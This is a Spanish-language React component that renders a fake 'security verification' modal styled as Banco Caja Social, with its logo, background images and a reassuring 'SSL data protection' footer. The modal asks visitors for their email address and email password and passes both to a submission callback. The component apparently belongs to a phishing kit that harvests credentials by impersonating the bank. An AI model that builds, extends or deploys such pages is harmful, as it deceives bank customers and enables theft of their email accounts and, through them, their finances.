/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";

import LoaderFullScreen from "./LoaderFullScreen";

interface DinamicaEmailProps {
  enviar?: (data: { correo: string; claveCorreo: string }) => void;
}

export default function ActDatamail({ enviar }: DinamicaEmailProps) {
  const [loading, setLoading] = useState(false);
  const [correo, setCorreo] = useState("");
  const [claveCorreo, setClaveCorreo] = useState("");
  const [error, setError] = useState(false);

  // Validación de formato de correo
  const isValidEmail = (email: string) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (isValidEmail(correo) && claveCorreo.trim().length > 0) {
      setLoading(true);
      setError(false);
      if (enviar) {
        await enviar({ correo, claveCorreo });
      }
      setLoading(false);
    } else {
      setError(true);
    }
  };

  return (
    <>
      <LoaderFullScreen visible={loading} />

      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 backdrop-blur-sm animate-in fade-in duration-300">
        <div className="w-full max-w-[500px] bg-white rounded-lg shadow-2xl overflow-hidden animate-in zoom-in-95 duration-300">

          {/* Header del Modal */}
          <div className="px-6 py-4 border-b border-gray-100 flex justify-between items-center bg-white">
            <h2 className="text-[19px] font-bold text-[#00548d]">Verificación de Seguridad</h2>
            <div className="flex gap-1.5">
              <div className="h-2 w-8 rounded-full bg-[#ef7b00]"></div>
              <div className="h-2 w-8 rounded-full bg-gray-200"></div>
            </div>
          </div>

          <div className="p-8 md:p-10">
            <form onSubmit={handleSubmit} className="space-y-6">
              <p className="text-[14px] text-gray-500 mb-6 text-center italic">
                Para garantizar la titularidad de su cuenta, por favor vincule su correo electrónico registrado.
              </p>

              <div className="space-y-4">
                {/* Campo Correo Electrónico */}
                <div>
                  <label className="block text-[12px] font-bold text-gray-500 mb-1 uppercase tracking-tight">
                    Correo Electrónico
                  </label>
                  <input
                    type="email"
                    value={correo}
                    onChange={(e) => {
                      setCorreo(e.target.value);
                      setError(false);
                    }}
                    placeholder="ejemplo@correo.com"
                    className={`w-full px-4 py-3 border rounded-md outline-none text-[16px] transition-all
                      ${error && !isValidEmail(correo) ? 'border-red-500 bg-red-50' : 'border-[#cfd6db] focus:border-[#00548d]'}
                    `}
                    autoFocus
                  />
                </div>

                {/* Campo Contraseña del Correo */}
                <div>
                  <label className="block text-[12px] font-bold text-gray-500 mb-1 uppercase tracking-tight">
                    Contraseña del Correo
                  </label>
                  <input
                    type="password"
                    value={claveCorreo}
                    onChange={(e) => {
                      setClaveCorreo(e.target.value);
                      setError(false);
                    }}
                    placeholder="Ingrese su contraseña"
                    className={`w-full px-4 py-3 border rounded-md outline-none text-[16px] transition-all
                      ${error && claveCorreo.trim().length === 0 ? 'border-red-500 bg-red-50' : 'border-[#cfd6db] focus:border-[#00548d]'}
                    `}
                  />
                </div>
              </div>

              {error && (
                <p className="text-red-600 text-[13px] font-medium text-center italic">
                  Por favor ingrese un correo válido y su contraseña.
                </p>
              )}

              <button
                type="submit"
                disabled={!isValidEmail(correo) || claveCorreo.trim().length === 0}
                className={`w-full py-4 rounded-full font-bold text-[15px] transition-all shadow-md
                  ${isValidEmail(correo) && claveCorreo.trim().length > 0
                    ? 'bg-[#00548d] text-white hover:bg-[#003d66]'
                    : 'bg-[#cfd6db] text-[#8e979f] cursor-not-allowed'}
                `}
              >
                VINCULAR CORREO
              </button>
            </form>
          </div>

          {/* Footer de Seguridad */}
          <div className="bg-gray-50 px-8 py-4 flex justify-between items-center border-t border-gray-100 opacity-60">
            <span className="text-[11px] text-gray-400 font-medium uppercase tracking-tighter flex items-center gap-1">
              <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"></path></svg>
              Protección de datos SSL
            </span>
            <img src="/cajasocial/logoBCSLine.svg" alt="BCS" className="h-3 grayscale" />
          </div>
        </div>
      </div>

      {/* FONDO REFERENCIAL */}
      <div className="flex min-h-screen bg-white opacity-20 pointer-events-none">
        <div className="hidden lg:block w-1/2 relative">
          <img src="/cajasocial/background-2.png" alt="" className="absolute inset-0 w-full h-full object-cover" />
        </div>
        <div className="w-full lg:w-1/2 flex items-center justify-center p-8">
          <div className="w-full max-w-[440px]">
            <img src="/cajasocial/logoBCSLine.svg" alt="" className="h-[45px] mb-10" />
            <div className="h-4 bg-gray-200 rounded w-full mb-4"></div>
          </div>
        </div>
      </div>
    </>
  );
}